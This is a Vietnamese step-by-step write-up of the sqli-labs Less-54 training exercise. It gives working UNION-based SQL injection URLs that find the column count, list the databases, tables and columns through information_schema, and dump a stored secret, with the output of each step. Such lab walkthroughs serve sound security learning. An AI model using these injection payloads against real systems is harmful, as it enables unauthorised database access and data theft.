- Bước 1: ID = 1

`http://10.10.10.171/sqli-labs/Less-54/index.php?id=1`

output

```
Your Login name:Dumb
Your Password:Dumb
```

- Bước 2: Sử dụng order để tìm số columns được sử dụng

```
http://10.10.10.171/sqli-labs/Less-54/index.php?id=1' ORDER BY 4 --+
http://10.10.10.171/sqli-labs/Less-54/index.php?id=1' ORDER BY 3 --+
```

=> Dừng lại ở order by 3 

- Bước 3: Dump database

`http://10.10.10.171/sqli-labs/Less-54/index.php?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata --+`

output 

```
Your Login name:2
Your Password:information_schema,challenges,mysql,performance_schema,security
```

=> chú ý vào db `challenges`

- Bước 4: Dump tables trong `challenges`

`http://10.10.10.171/sqli-labs/Less-54/index.php?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+`

output 

```
Your Login name:2
Your Password:OMMGMTJC4D
```

- Bước 5: Dump columns trong `OMMGMTJC4D`

`http://10.10.10.171/sqli-labs/Less-54/index.php?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='OMMGMTJC4D'--+`

output

```
Your Login name:2
Your Password:id,sessid,secret_QSLR,tryy
```

- Bước 6:

`http://10.10.10.171/sqli-labs/Less-54/index.php?id=0' union select 1,2,group_concat(secret_QSLR) from OMMGMTJC4D--+
`

output

```
Your Login name:2
Your Password:x0gmaPL2OkLnGIjp48CPKXwZ
```

Nhập `x0gmaPL2OkLnGIjp48CPKXwZ` và submit
